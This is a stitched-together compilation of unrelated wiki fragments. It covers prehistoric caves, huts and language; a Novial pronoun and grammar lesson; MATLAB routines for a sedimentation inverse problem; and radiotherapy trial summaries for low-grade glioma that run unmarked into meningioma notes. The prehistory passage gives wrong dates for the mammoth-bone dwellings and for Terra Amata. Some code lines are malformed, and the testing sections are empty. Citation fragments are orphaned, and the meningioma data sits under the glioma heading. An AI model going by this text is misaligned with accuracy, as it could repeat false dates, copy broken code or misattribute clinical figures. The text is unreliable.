Some scholars today believe that these caves were the work of ''Homo sapiens sapiens'' -- our own direct ancestor.  As of this writing, no artwork has yet been found at any ''Homo erectus'' or ''Homo neanderthalensis'' archaeological site, anywhere in the world.  The creation of art, and the symbolic thinking that goes with creating sculptures or paintings, may truly be the mental process that separates human beings from other types of animals.  Other scholars contest this claim.

==== Tents and Huts ====
Other than caves, modern archaeologists know few other types of shelter available to ancient peoples.  Some examples exist, but they are quite rare.  In Siberia, a group of Russian scientists uncovered a house or tent with a frame constructed of mammoth bones.  The great tusks supported the roof, while the skulls and thigh bones formed the walls of the tent.  Several families could live inside, where three small hearths, little more than rings of stones, kept people warm during the winter.  Archaeologists presume that the roof was made of mammoth hides in several layers.  Similar houses existed in France and Germany; all date to about 90,000 years ago.  

Much more recently than that, around 50,000 years ago, a group of Paleolithic ''Homo sapiens'' camped on a lake shore in southern France.  At Terra Amata, these hunter-gatherers built a long and narrow house.  The foundation was a ring of stones, with a flat threshold stone for a door at either end.  Vertical posts down the middle of the house supported roofs and walls of sticks and twigs, probably covered over with a layer of straw.  A hearth outside served as the kitchen, while a smaller hearth inside kept people warm.

Both dwellings could be easily abandoned by their residents.  This is why they are not considered true houses, which was a development of the Neolithic period rather than the Paleolithic period.  However, they give us brief looks at the lives of our most distant ancestors.

=== Language and Culture ===
In modern eyes, perhaps the most significant technology of the Paleolithic Age was the development of language.  Language is not strictly speaking a technology&amp;mdash;you cannot hold it or touch it.  Instead, it relies upon changes in the human brain&amp;mdash;the development of speech centers to govern the tongue and lips to produce precise sounds, the development of memory to hold lists of words, the development of rules to govern how those words are used in different circumstances, and the development of hearing centers in the brain to process foreign sounds as words within a set of rules.  These functions did not come overnight.  Fire may have stimulated some of them: ancient peoples sat or danced around fires, and they must have had stories to tell each other of their discoveries.  Hunting stimulated others: needing to catch food that ran away required co-ordination among different hunters.  People also created language while searching for edible plants, and plants with medical properties to cure or lessen the hurts of themselves and their families.

With the development of language came the development of '''culture'''.  Having a name for a thing -- be it a plant, an animal, a stone, a tool, or an event -- meant that early humans carried ideas about how the world worked.  They taught those ideas to their children, and to their children after them.  Young people not only learned what plants to eat and what not to eat, they learned about the dead and the living within their family and beyond; they learned how to make tools, and what those tools were for. By extension, children learned what they should do and what they should not -- a series of prescriptions and taboos that governed behavior.  As different groups of humanity spread across the globe, some of these prescriptions and taboos were forgotten, and new ones were learned.  Different places, with different animals and plants, and different dangers, developed different lists of forbidden and acceptable activities.  In this way, the many peoples and tribes and cultures of the world originated.

By 20,000 years before the present, with the exception of some islands off the beaten track of human exploration, humans had settled in virtually every place in the world.  Then came the Ice.

==&lt;font color=&quot;#CC6600&quot;&gt;Grammar Notes and Exercises&lt;/font&gt;==

===&lt;font color=&quot;#FF9933&quot;&gt;Personal Pronouns – Subject, Object and Possession&lt;/font&gt;===

The subject and object forms (e.g English ''I'' and ''me'') of Novial pronouns are the same:

*'''me''' – ''I, me'' 		
*'''nus''' – ''we, us''
*'''vu''' – ''you'' (one person) 	
*'''vus''' – ''you'' (more than one person)
*'''lo''' – ''he, him''	
*'''los''' – ''they, them'' (all male)
*'''la''' – ''she, her''	
*'''las''' – ''they, them'' (all female)
*'''le''' – ''he or she, him or her''	
*'''les''' – ''they, them''
*'''lu''' – ''it''		
*'''lus''' – ''they, them'' (all sexless objects)

Notice that in the third person, male and female have the endings '''-o''' and '''-a''' respectively. The ending '''-e''' indicates either male or female without specifying. The ending '''-u''' indicates a sexless thing.
Plurals all end in '''-s'''. '''Les''' is conveniently used to mean ''they, them'' as in English, i.e. it is not specified whether ''they'' are sexless or not, and ''they'' may be any mixture of male, female and sexless things. This system is flexible and allows more speakers to follow their natural language habits. So the French may often choose to use '''las''' and '''los''', while most English speakers would choose to use '''les''', ignoring the sex distinction which is here absent in English.  A Finnish speaker may prefer to use '''le''' (''he or she''), since the ''he/she'' distinction is absent in Finnish. The pronoun '''le''' is also very convenient to say ''he or she'' using a single word and avoiding sex bias.

The standard word order is, as in English, '''subject-verb-object''', so the object need not be marked to distinguish it from the subject:
*'''me observa vu''' – ''I observe you''
*'''vu observa me''' – ''you observe me''

The personal possessive adjectives are formed from the pronouns by adding '''-n''' or after a consonant '''-en'''. This is in fact the genitive (possessive) of the pronoun so '''men''' means both ''my'' and ''mine'' (''of me''):
*'''lu es men hunde''' – ''it is my dog''
*'''lu es men''' – ''it is mine''

*'''men''' – ''my, mine''		
*'''nusen''' – ''our, ours''
*'''vun''' – ''your, yours''		
*'''vusen''' – ''your, yours'' (more than one person)  
*'''lon''' – ''his''			
*'''losen''' – ''their, theirs'' (all male)
*'''lan''' – ''her, hers''		
*'''lasen''' – ''their, theirs'' (all female)
*'''len''' – ''his or her, his or her''s	
*'''lesen''' – ''their, theirs''
*'''lun''' – ''its''			
*'''lusen''' – ''their, theirs'' (all sexless objects)

===&lt;font color=&quot;#FF9933&quot;&gt;Verb – Present Tense, Imperative, Infinitive and Negative&lt;/font&gt;===

As in English the present tense of the verb and the imperative are identical:
*'''me dikte''' – ''I say'' or ''I am saying''
*'''dikte! ''' – ''say! ''

Note that the English present continuous, such as ''you are saying'', is translated by the simple present: 
*'''vu dikte'''
The infinitive is also the same as the present: 
*'''me prefera dikte''' – ''I prefer to say''

The negative is formed with '''non''' (''not''), which usually precedes the word which it negates. The negative answer to a question is '''no''' (''no''), while the positive answer is '''yes''' (''yes'').
*'''nus non sava lu''' – ''we don’t know it''

The verb never varies with the person:
*'''me sembla''' – ''I seem''		
*'''nus sembla''' – ''we seem''
*'''vu sembla''' – ''you seem''		
*'''vus sembla''' – ''you seem''
*'''le sembla''' - ''he or she seems''	
*'''les sembla''' – ''they seem''

===&lt;font color=&quot;#FF9933&quot;&gt;Articles, Plural Nouns and Nouns with Natural Sex&lt;/font&gt;===

The plural of a noun is formed by adding the ending '''-s''' ('''-es''' after a consonant) and the definite article '''li''' (''the'') is invariant as in English:
*'''li probleme''' – ''the problem''
*'''li problemes''' – ''the problems''

For convenience '''de li''' (''of the'') is usually shortened to '''del''' and likewise '''a li''' (''to the'') to '''al''' and '''da li''' (''by the'') to '''dal'''.
There is no indefinite article (''a, an'') in Novial. This causes no ambiguity as seen in English when the plural indefinite article (''some'') is dropped:
*'''hunde''' – ''dog, a dog''
*'''hundes''' – ''dogs, some dogs''

The indication of sex in the third person pronouns with the endings '''-e''', '''-o''' and '''-a''' is also used with nouns that have natural gender:
*'''doktore''' – ''doctor'' (male or female)		
*'''doktora''' – ''female doctor''		
*'''doktoro''' – ''male doctor''
		
*'''hunde''' – ''dog''
*'''hunda''' – ''bitch, female dog''
*'''hundo''' – ''male dog''
			
*'''siniore''' – ''sir or madam''		
*'''siniora''' – ''madam, Mrs''			
*'''sinioro''' – ''sir, Mr''			
*'''siniores''' – ''ladies and gentlemen''
		
*'''home''' – ''person''
*'''homa''' – ''female person'' (adult or child)
*'''homo''' – ''male person'' (adult or child)
*'''homes''' – ''people''

Many sexless nouns also end in '''-e''' and these of course cannot change the ending to indicate sex differences.

===&lt;font color=&quot;#FF9933&quot;&gt;Adjectives&lt;/font&gt;===

All adjectives end in an '''-i''', which may be dropped if easy to pronounce. Adjectives usually precede the noun that they qualify. As in English, adjectives do not agree with their noun in number or gender: 
*'''boni puera''' or '''bon puera''' – ''a good girl''
*'''boni pueras''' or '''bon pueras''' – ''good girls''
*'''boni puero''' or '''bon puero''' – ''a good boy''
*'''boni pueros''' or '''bon pueros''' – ''good boys''
*'''boni pueres '''or '''bon pueres''' – ''good children (boys and/or girls'')

===&lt;font color=&quot;#FF9933&quot;&gt;Questions&lt;/font&gt;===
 
Question words such as '''que''' (''who?'') or '''pro quu''' (''why? '') directly indicate a question and the subject-verb-object order need not be changed:  
*'''pro quu vus visita nus? ''' – ''why are you visiting us?'' (Literally: ''why you visit us? '')
*'''que visita nus? ''' – ''who is visiting us''? (Literally: ''who visits us? '')

Otherwise a question is indicated with the general question word '''ob''' (''is it that?''), again with no change in the standard word order of the remainder of the sentence:
*'''ob vu es lan amike? ''' – ''are you her friend?'' (Literally: ''is it that you are her friend? '') 
*'''ob vu sava li familie? ''' – ''do you know the family?'' (Literally: ''is it that you know the family? '')

=== Measurement data ===
As measurement data, the height (in meter) of the upper interface versus time (in seconds) is taken.
The batch settling process has the homogenious initial concentration u0=0.123. The container has the height L=0.405, the measurements are observed up to the final time T=34800.

=== Mfiles === 
Subroutines are encapsulated by Mfiles (Matlab files with ending .m). 

==== Direct problem ====
The closure functions are prescribed by
 function f = f(u)
 global uinf umax C
 f=uinf.*u.*(1-u).^C.*(u&gt;0).*(u&lt;umax); 
and 
 function a = a(u)
 global a0 uc C k umax
 a=a0.*(1-u).^C.*u.^(k-1).*(u&gt;uc).*(u&lt;umax);
The Engquist-Osher numerical flux function is implemented as
 function feo = feo(g,u,v)
 global um
 fgu=feval(g,u); fgum=feval(g,um); fgv=feval(g,v); fguvum=fgu+fgv-fgum;
 lu=u&lt;=um; lv=v&lt;=um;
 feo= lu.*lv.*fgu + lu.*~lv.*fguvum + ~lu.*lv.*fgum + ~lu.*~lv.*fgv;
The right-hand side of the linear system and the block-triangular matrix is assembled in the routine
 function [M b]=Mb(g,u)
 global Au J dt dx epsilon
 F=feo(g,u(1:J-1), u(2:J)); % f_{j+1/2}
 Ax=Au(floor(u.*(u&gt;=0).*(u&lt;=1)*length(Au))+(u&lt;1));
 b=dt/dx*([F(1:J-1);0]-[0;F(1:J-1)])-dt/dx^2*([Ax(1:J-1);0]-[0;Ax(2:J)]-[Ax(1:J-1);0]+[0;Ax(1:J-1)]);
 ax=a(u);
 epsilon=1e-5;
 F1eps=feo(g,u(2:J)+epsilon,u(1:J-1));
 F2eps=feo(g,u(2:J),u(1:J-1)+epsilon); 
 Jminus=(F1eps-F)/epsilon;
 Jplus=(F2eps-F)/epsilon;
 M1=-dt/dx*[Jminus(1:J-1)] - dt/dx^2*[ax(1:J-1)];
 M2=1+dt/dx*([Jminus(1:J-1);0] - [0;Jplus(1:J-1)]) + 2*dt/dx^2*ax;
 M3=dt/dx*[Jplus(1:J-1)]-dt/dx^2*[ax(2:J)];
 M=diag(M1,-1)+diag(M2,0)+diag(M3,1);
such that the direct problem can be solved by
 function U = S(g,u,T)
 global dt
 U=u;
 for dt=diff(T)
   [M b]=Mb(g,u);
   du=M\b;
   u=u+du;
   U=[U,u];
 end
The time steps of the numerical method are adapted to the measurment times. They can be refined by the factor 2 by the following mfile:
 function T = refinetime(T) 
 dThalf=diff(T)/2; 
 taxis=2:2:2*length(T)-2; 
 dT(taxis)=dThalf; 
 dT(taxis-1)=dThalf; 
 Tnew=cumsum(dT); 
 T=Tnew; 

==== Optimization ====
As result of the numerical simulation, one obtains a grid of computed volume fractions. From this grid one can extract a computed upper interface.

First, an upper and a lower bound on the grid, consisting of two neighboring cells has to be found for each time. The computational interface is yielt by linear interpolation.
 function h=interface(U,u)
 [uupper iupper]=max(U-u - (U-u&gt;0));
 [ulower ilower]=min(U-u + (U-u&lt;0)); 
 h=X(iupper)+(X(ilower)-X(iupper)).*(0-uupper)./(ulower-uupper);
Qdq computes Q and dq is used in the main optimization step
 function [Q dq]=Qdq(e)
 global epsilon
 q=cost(e,0);
 for K=[1 2], q1(K)=cost(e,K); end
 for K=[1 1 2 2; 1 2 1 2]; q2(K(1),K(2))=cost(e,K); end
 dq=(q1-q)/epsilon;
 Q=(q2'-2*q1'*[1,1]+q)/epsilon^2;
 % the last computation is a short form for
 %
 % Q11=(q2(1,1) - 2*q1(1)+q)/epsilon^2;
 % Q22=(q2(2,2) - 2*q1(2)+q)/epsilon^2;
 % Q12=(q2(2,1) - 2*q1(1)+q)/epsilon^2;
 % Q21=(q2(1,2) - 2*q1(2)+q)/epsilon^2;
 % 
 % Q=[Q11 Q12; Q21 Q22];
The cost function is evaluated as
 q=function cost(e,K)
 global T H u0
 parametershift(e,K)
 U=S('f',T);
 q=norm(h-H);
The small variation over the parameters is done by a parametershift
 function parametershift(e,K)
 global uinf C a0 uc k epsilon emask
 eder=[]; for j=K, eder=[eder, emask(j)]; end
 I=diag(ones(size(e)));
 eplus=e+sum(I(eder,:))*epsilon;
 uinf=eplus(1); C=eplus(2); a0=eplus(3);  uc=eplus(4); k=eplus(5);

=== Testing of direct scheme ===
The constitutive assumptions can be plotted by
 global umax uinf C a0 uc k
 umax=0.66; uinf=1; C=5; a0=1; uc=0.1; k=3;
 u=(0:0.01:1)'; au=a(u); fu=f(u);
 subplot(2,1,1); plot(u,au); subplot(2,1,2); plot(u,fu)
The maximum of the flux function which is used in the Engquist-Osher numerical flux is computed as
 global um; [gm im]=max(fu); um=u(im); 
 subplot(2,1,2); hold on; plot(um,gm,'gx')
The integral A is calculated by the [[NumericM:Numerical Integration|trapezoidal rule]]
 global Au
 Au=[0;cumsum(([au(1:length(u)-1);0]+[au(2:length(u));0])/2)];
 subplot(2,1,2); cla; plot(u,Au)
Testing Mb
 global dt dx; dx=max(H)/5; X=(0:dx:max(H));
 u=0.123*ones(size(X'));
 global J; J=length(u);
 [M b]=Mb('f',u)
Testing S
 T=[0:0.01:0.04];
 U=S('f',u,T);
 figure(1); hold on; for u=U, plot(u,1:length(u)),pause; end

=== Testing of optimization scheme ===


Testing interface
 .
Testing Qdq
 .
Testing cost function
 .

Testing parametershift
 global uinf C a0 uc k
 global epsilon; epsilon=0.1;
 global emask; emask=[2,5];
 e=[1 2 3 4 5];
 K=[1 1 2];
 parametershift(e,K);
 [uinf, C, a0, uc, k]


=== One optimization step === 
A single optimization step is performed by
 global epsilon; epsilon=1e-5;
 global u0; u0=0.123*ones(J,1);

 e=[1 2 3 4 5];
 [Q dq] = Qdq(e);
 de=Q\dq;
 e=e+de;
where the above defined subroutines are employed.

=== Time estimate for reasonable accuracy ===
Time estimate for reasonable accuracy, where J=100 and T=100, the main loop Mb has to be called 700 times for one optimization step.
 tic, for k=1:1000;  [M b]=Mb('f',u); end; toc
gives: &quot;Elapsed time is 14.469154 seconds.&quot;
This is rather reasonable.</text>

&lt;big&gt;'''Adult Low Grade Glioma'''&lt;/big&gt;

==Overview==
*Relatively slow-growing primary brain tumors
*Account for ~10% of primary CNS tumors in USA
*Median age at diagnosis is 40's for adult tumors, and teens for pilocytic astrocytoma
*Heterogenous clinical presentation ranging from seizure only to functional deficits 
*Classified as Grade I or Grade II by WHO; common histologic subtypes include astrocytomas, oligodendrogliomas, and mixed oligoastrocytomas. 
*Anaplastic transformation to high grade is common, in 70-80% patients
*Surgery is typically first option
*RT may be offered as adjuvant or as salvage; while time-to-progression and control of seizures is better with adjuvant RT, there is no difference in overall survival
*There does not seem a strong dose response between 45 and 65 Gy based on two randomized trails (EORTC 22844 compared 45 Gy vs. 59.4 Gy, INTERGROUP compared 50.4 Gy vs. 64.8 Gy); as a result, NCCN recommends 45 - 54 Gy as a reasonable dose
*5-year overall survival is 60-70%, while progression-free survival is 40-50%


==Prognostic Factors==
'''''1p/19q fusion or deletion'''''
*'''NCCTG Trials; 2006''' PMID 17047046 -- &quot;A t(1;19)(q10;p10) mediates the combined deletions of 1p and 19q and predicts a better prognosis of patients with oligodendroglioma.&quot; (Jenkins RB, Cancer Res. 2006 Oct 15;66(20):9852-61).
**119 patients enrolled on 2 low-grade glioma NCCTG trials. Translocation t(1;19) evaluated by FISH
**Fusion prevalence: oligodendroglioma 55%, mixed oligoastrocytoma 47%, astrocytoma 0%
**Median OS: all patients - fusion/deletion 11.9 years vs. no fusion 8.1 years (SS); oligodendroglioma only - fusion/deletion 13.0 years vs. no fusion 9.1 years (SS)
**Conclusion: t(1;19) mediates combined 1p/19q deletion, and is associated with superior OS and PFS in low-grade gliomas


'''''Prognostic Grouping'''''
*'''EORTC 22844/22845'''
**'''2002''' PMID 11956268, &quot;Prognostic factors for survival in adult patients with cerebral low-grade glioma.&quot; (Pignatti F et al. J Clin Oncol. 2002 Apr 15;20(8):2076-84.)
**EORTC 22844 (construction set = 322 patients) and EORTC 22845 (validation set = 288 patients)
**Poor prognosis: Age &gt;= 40, astrocytoma histology, tumor &gt;= 6 cm, tumor crosses midline, neurologic deficits prior to surgery; no impact from extent of surgery

==Adjuvant RT Dose==
*'''EORTC 22844''' (1985-1991) &quot;Believers Trial&quot;
**Randomized. 343 patients. Age 16-65. Included astrocytoma, oligodendroglioma, mixed oligoastrocytoma. Excluded completely excised pilocytic astrocytoma. Surgery first. Randomized to low dose 45 Gy vs high dose 59.4 Gy at 1.8 Gy/fx. RT technique: 2 cm margin around enhancing tumor to 45 Gy, reduced field 1 cm margin to 54 Gy and minimal margin to 59.4 Gy.
**'''5-years; 1996''' PMID 8948338, 1996 &amp;mdash; &quot;A randomized trial on dose-response in radiation therapy of low-grade cerebral glioma: European Organization for Research and Treatment of Cancer (EORTC) Study 22844.&quot; Karim AB et al. Int J Radiat Oncol Biol Phys. 1996 Oct 1;36(3):549-56. Median F/U 6.2 years
***5-year outcome: No difference in OS (58% vs 59%) or PFS (47% vs 50%)
***Predictors: Age, size, neurologic status, amount of surgery
***Conclusion: No dose response above 45 Gy
**'''Quality of life; 1998''' PMID 10023313 -- &quot;Quality of life after radiation therapy of cerebral low-grade gliomas of the adult: results of a randomised phase III trial on dose response (EORTC trial 22844). EORTC Radiotherapy Co-operative Group.&quot; (Kiebert GM, Eur J Cancer. 1998 Nov;34(12):1902-9.)
***Questionnaire, 47 items
***Outcome: high RT group had more fatigue/malaise, emotional functioning
***Conclusion: 45/25 schedule better

*'''Intergroup NCCTG/RTOG/ECOG''' (1986-1994)
**Randomized. 203 patients. Age &gt;18. Included low grade astrocytoma, oligodendroglioma, or mixed oligoastrocytoma; pilocytic astrocytomas were excluded. Randomized to 50.4 Gy vs 64.8 Gy. RT technique: 2 cm margin around preoperative tumor volume, 1 cm margin for boost after 50.4 Gy.
**'''5-years; 2002''' PMID 11980997 &amp;mdash; &quot;Prospective randomized trial of low- versus high-dose radiation therapy in adults with supratentorial low-grade glioma: initial report of a North Central Cancer Treatment Group/Radiation Therapy Oncology Group/Eastern Cooperative Oncology Group study.&quot; (Shaw E et al. J Clin Oncol. 2002 May 1;20(9):2267-76.) Median F/U 6.4 years
***5-year outcome: OS low dose 72% vs. high dose 65% (NS); time-to-progression 58% vs. 52% (NS). Failure within field 92%
***Toxicity: more often and more severely in high dose arm (2.5% vs 5%)
***Poor prognosis: astrocytoma, age &gt;40, tumor &gt;=5 cm (5-year OS if &lt;40 and oligodendroglioma 82% vs. &gt;40 and astrocytoma 32%)
***Conclusion: No benefit for higher RT dose
**'''MMSE Cognitive; 2003''' PMID 12829670 -- &quot;Effects of radiotherapy on cognitive function in patients with low-grade glioma measured by the folstein mini-mental state examination.&quot; (Brown PD, J Clin Oncol. 2003 Jul 1;21(13):2519-24.)
***Prospective. 203 patients evaluated with Mini-Mental State Examination at baseline and follow-up. Median F/U 7.4 years
***7.4-year outcome: Stable MMSE in 95% patients without tumor progression. If abnormal baseline MMSE, experienced significant improvement after treatment
***Conclusion: Most patients had stable neurocognitive status on MMSE after RT
**'''Full Cognitive; 2005''' PMID 15964709 -- &quot;Cognitive function after radiotherapy for supratentorial low-grade glioma: a North Central Cancer Treatment Group prospective study.&quot; (Laack NN, Int J Radiat Oncol Biol Phys. 2005 Nov 15;63(4):1175-83.)
***Subset. 20 patients (10 low dose, 10 high dose) treated at Mayo Clinic. Evaluated with extensive battery of tests at baseline, and then every 1.5 years. Median F/U 3 years
***Outcome: baseline scores below average compared with age-specific norms. No changes in cognitive performance regardless of stratification (dose, age, location, type, or resection)
***Conclusion: Cognitive function stable after RT


==Early vs Delayed Radiotherapy==
*'''EORTC 22845''' (1986-1997) &quot;Non-Believers Trial&quot;
**Randomized. 314 patients. Age 16-65. Supratentorial low grade astrocytoma, low grade oligoastrocytoma, or low grade oligodendroglioma. Excluded small completely resected [[Radiation_Oncology/Pilocytic_Astrocytoma|pilocytic astrocytomas]], [[Radiation_Oncology/Optic_Pathway_Glioma|optic nerve gliomas]], brainstem gliomas, third ventricle gliomas, and infratentorial gliomas. Surgery first. Randomized to early radiotherapy with 54 Gy (1.8 Gy/fx) vs delayed radiotherapy until the time of progression. CT with contrast every 4 months until progression. Technique: preop CT + 2 cm margins to 45 Gy, reduced field to 1 cm after 45 Gy.
**'''2005''' PMID 16168780 &amp;mdash; &quot;Long-term efficacy of early versus delayed radiotherapy for low-grade astrocytoma and oligodendroglioma in adults: the EORTC 22845 randomised trial.&quot; (van den Bent MJ et al. The Lancet Volume 366, Issue 9490, 17 September 2005, Pages 985-990.) Median F/U 7.8 years
***Outcome: Median PFS early RT 5.3 yrs vs delayed RT 3.4 yrs (SS). 5-year PFS 55% vs. 35% (SS).  Median OS 7.4 vs 7.2 yrs (NS), 5-year OS 68.4% vs 65.7% (NS). 65% of pts in control group received RT at progression, 4% in early RT received salvage RT.  At 1 yr, better control of seizures in early RT group (25% vs. 41%, SS).
***After progression: survival early RT 1.0 years vs. delayed RT 3.4 years (SS). ~70% transformed to high grade tumors, regardless if they had RT or not. Most recurrences within field
***Toxicity (compared at 1 year for patients still tumor free at 2 years): No difference in cognitive deficit, focal deficit, performance status, or headaches. 
**Conclusion: Early RT lengthens PFS and controls seizures, but doesn't impact OS
**Comment: Tumor planning off CT, central path showed 26% were high grade tumors but balanced between arms, no QoL analysis. Lack of OS difference likely due to effectiveness of salvage RT

==RT +/- Chemotherapy==
*'''RTOG 98-02 / INT''' (1998-2002) -- RT +/- PCV
**Randomized arm + observation arm. 362 patients, WHO Grade II supratentorial astrocytoma, oligoastrocytoma, or oligodendroglioma
***High risk LGG (age &gt;=40 or STR/bx; 251 patients): Arm 1) RT 54/30 alone vs. Arm 2) RT + PCV x6 cycles. RT given T2 + 2 cm block-edge margin
***Low risk LGG (age &lt;40 and GTR; 111 patients): Observation only 
**'''4-years; 2006''' [http://meeting.ascopubs.org/cgi/content/abstract/24/18_suppl/1500 ASCO Abstract 1500] (slides + video) &amp;mdash; &quot;Initial report of Radiation Therapy Oncology Group (RTOG) 9802: Prospective studies in adult low-grade glioma (LGG).&quot; Shaw EG et al. Journal of Clinical Oncology, 2006 ASCO Annual Meeting Proceedings Part I. Vol 24, No. 18S (June 20 Supplement), 2006: 1500. Median F/U 4 years
***Outcome: 
****High risk: 5-year OS RT 61% vs. RT + PCV 70% (NS); PFS 39% vs. 61% (NS)
****Low risk: 5-year OS 94%; PFS 50%
***Toxicity: Grade 3-4 RT 9% vs. RT + PCV 67%. No treatment deaths
***Conclusion: Poor 5-year PFS in all 3 arms; no survival advantage for adding adjuvant PCV in high risk patients
**'''6-years; 2008''' [http://www.asco.org/ASCO/Abstracts+&amp;+Virtual+Meeting/Abstracts?&amp;vmview=abst_detail_view&amp;confID=55&amp;abstractID=32096 ASCO Abstract 2006] -- &quot;Final report of Radiation Therapy Oncology Group (RTOG) protocol 9802: Radiation therapy (RT) versus RT + procarbazine, CCNU, and vincristine (PCV) chemotherapy for adult low-grade glioma (LGG).&quot; (Shaw EG, J Clin Oncol 26: 2008 (May 20 suppl; abstr 2006)) 
***Median Follow-Up: 5.9 years
***High risk outcome: 5-year OS RT 63% vs. RT + PCV 72% (NS); PFS 46% vs. 63% (p=0.06). In years 0-2 no difference, beyond 2 years significant benefit for RT+PCV. HR for death 0.52, for PFS 0.45
***Conclusion: PFS but not OS were improved with addition of PCV. Beyond 2 years, OS advantage, and decreased risk of death by 48%

***All pts had neurosurgeon-determined GTR. OS 2-yr 99% and 5-yr 93%; PFS 82% and 48%. Prognostic factors (worse PFS): tumor &amp;ge; 4cm, astrocytoma or oligoastrocytoma (vs oligodendroglioma), residual tumor &amp;ge; 1 cm. Pts with residual &lt; 1cm had 26% recurr, vs 68% for 1-2 cm, vs 89% for &gt;2 cm.
***Conclusion: &gt;50% risk of tumor progression at 5 yrs.

Epub 2012 Jul 30.)
***MS 7.5 yr (RT) vs not reached (RT+PCV); 5-yr OS 63% vs 72% (HR 0.72, NS). Median PFS 4.4 yr vs not reached; 5-yr PFS 46% vs 63% (HR 0.6, p=0.06). OS and PFS curves were similar between years 0-2, then separated after 2 yrs favoring RT+PCV. 
***Conclusion: &quot;PFS but not OS was improved for adult patients with LGG receiving RT + PCV versus RT alone. On post hoc analysis, for 2-year survivors, the addition of PCV to RT conferred a survival advantage, suggesting a delayed benefit for chemotherapy.&quot;

==Epidemiology==
*Most common &lt;u&gt;benign&lt;/u&gt; brain tumor
**Approximately 95%
*Represents 20% of primary intracranial neoplasms.
*Occur mostly in age group 40-70 yrs old, increasing in incidence with age, and peaking at 70.
*F&gt;M 2:1

==Risk Factors==
*Prior radiation therapy
**Treatment of tinea capitis with radiation is classic scenario of radiation induced meningioma.
**PCI increases incidence of meningioma by 10X baseline rate.
**Median interval between radiation treatment and development of meningioma is ~20 yrs.
*Type II Neurofibromatosis
*Hormone replacement therapy in women


*'''Mayo Clinic; 2008''' (1993-2003) PMID 18182668 -- &quot;Is there an association between meningioma and hormone replacement therapy?&quot; (Blitshteyn S, J Clin Oncol. 2008 Jan 10;26(2):279-82.)
**Retrospective. 1390 women with meningioma, 11% current/past HRT users
**Outcome: OR for HRT use and meningioma 2.2 (SS)
**Conclusion: Positive association between HRT use and diagnosis for meningioma

*CT
**Well-defined extra-axial mass that displaces normal brain. Smooth in contour, sometimes calcified
**About 60% hyperdense with normal brain without contrast
**About 70% brightly and homogenously enhance with contrast (less frequent in malignant or cystic meningiomas)
*MRI
**Preferred imaging because it can show dural origin
**Dural tail sign seen in about two-thirds: characteristic marginal thickening that tapers peripherally along the dura
**Isointense on T1, hyperintense (usually homogeneously) on T2, strong enhancement with IV contrast
*PET
**May have a role in predicting aggressiveness of meningioma: more aggressive tumors appear to have significantly higher mean rate of glucose utilization

==WHO Classification==
*'''Benign''' (Grade I) - (90%) - meningothelial, fibrous, transitional, psammomatous, angioblastic (most aggressive)
*'''Atypical''' (Grade II) - (7%) - choroid, clear cell, atypical
*'''Anaplastic/Malignant''' (Grade III) - (2%) - papillary, rhabdoid, anaplastic


*'''Korea; 2007''' (1986-2004) PMID 17766430 -- &quot;Atypical and anaplastic meningiomas: prognostic implication of clinicopathological features.&quot; (Yang SY, J Neurol Neurosurg Psychiatry. 2007 Aug 31)
**Retrospective. 74 patients with high grade (33 atypical, 41 anaplastic). Reclassified according to 2000 WHO. Mean F/U 4.8 years
**Outcome: OS atypical 11.9 years vs. anaplastic 3.3 years; RFS atypical 11.5 years vs. anaplastic 2.7 years
**If atypical, brain invasion and RT didn't improve survival; if anaplastic, prognostic factors were brain invasion, adjuvant RT, p53 overexpression, extent of resection
**Conclusion: 2000 WHO classification better than previous criteria

==Treatment Overview==
*Treatment can range from conservative management to definitive surgery, adjuvant radiation or definitive radiation/radiosurgery.
*Patients with small asymptomatic meningiomas found incidentally can be observed until they grow or become symptomatic.
*Indications for adjuvant radiation therapy:  incomplete resection and high grade tumor.  Tx to dose of 54 Gy for Grade I and 60 Gy for Grade II-III.
*Cavernous sinus meningioma represent a scenario where SRS is particularly useful given the potential morbidity of surgical resection in that region.
*[http://www.uptodate.com/ UpToDate] recommendations (version 15.2, 4/2007)
**Small, asymptomatic meningioma: careful observation with re-imaging in 3-6 months
***If no growth at first F/U, routine imaging q1 year
***If tumor growth, active treatment
**Young patients with asymptomatic meningioma: consider surgery
**Symptomatic, large, infiltrative, or edematous lesions should be treated with surgery and/or RT
***If anatomically accessible: attempt surgical resection
***Simpson Grade I: no adjuvant therapy
***Simpson Grade II-III and benign: no adjuvant therapy
***Simpson Grade II-III and atypical/malignant: adjuvant RT
***Simpson Grade IV: adjuvant RT
**For patients who are unresectable, not surgical candidates, or refuse surgery, offer primary RT

==Observation==
*Majority (~2/3) of asymptomatic, incidentally found meningiomas are stable on imaging. If they progress, the rate of growth tends to be 2-4 mm per year and tumor doubling time is on average 20 years
*Calcified and hypointense on T2 meningiomas appear less likely to progress; elderly patients appear to have slower growth rates
*Reasonable to consider observation for asymptomatic meningiomas, particularly in elderly patients or patients with skull-base (high operative risk) tumors. If so, MRI at 3 months, then 6 months later, then annually is considered reasonable 
*For younger patients and patients with non-calcified tumors, consider treatment due to higher expected growth rates

**Retrospective. 43 patients, 51 meningiomas
**Outcome: 63% no growth, 37% growth (mean growth rate 4 mm / year)
**Predictors: younger age, sphenoid ridge location, non calcified, hyperintense on MRI T2 predicted for growth

*'''Hannover; 2003''' PMID 12823874 -- &quot;The natural history of incidental meningiomas.&quot; (Nakamura M, Neurosurgery. 2003 Jul;53(1):62-70; discussion 70-1.)
**Retrospective. 47 asymptomatic patients reviewed. 41 (87%) managed conservatively, 6 surgery
**Outcome: volumetric growth mean 0.8 cm3 / year, 66% growth rates &lt;1 cm3 / year; tumor doubling mean 22 years (1.3 - 143 years). Higher growth rates in younger patients. No correlation between initial size and doubling time. Less likely to progress if calcified
**Conclusion: Majority of incidental meningiomas minimal growth; can be managed conservatively

**Retrospective. 35 asymptomatic patients found incidentally. Mean F/U 6.2 years
**Outcome: 88% stable, 12% progressed, 3% (1 patient) developed symptoms. Less likely to progress if calcified 

*'''Northwestern; 1997''' PMID 9153494 -- &quot;Meningiomas: the decision not to operate.&quot; (Braunstein JB, Neurology. 1997 May;48(5):1459-62.)
**Retrospective. 12 patients managed conservatively in 100 consecutive meningiomas, either with no symptoms or high operative risk. Mean F/U 8.8 years
**Outcome: growth in 1/12 patients

*'''Illinois; 1995''' PMID 7616265 -- &quot;The natural history and growth rate of asymptomatic meningiomas: a review of 60 patients.&quot; (Olivero WC, J Neurosurg. 1995 Aug;83(2):222-4.)
**Retrospective. 60 patients diagnosed with asymptomatic meningioma. 45 patietns follow up scans at 3 months, 9 months, then q 1 year. Average F/U 2.7 years (0.5-15).
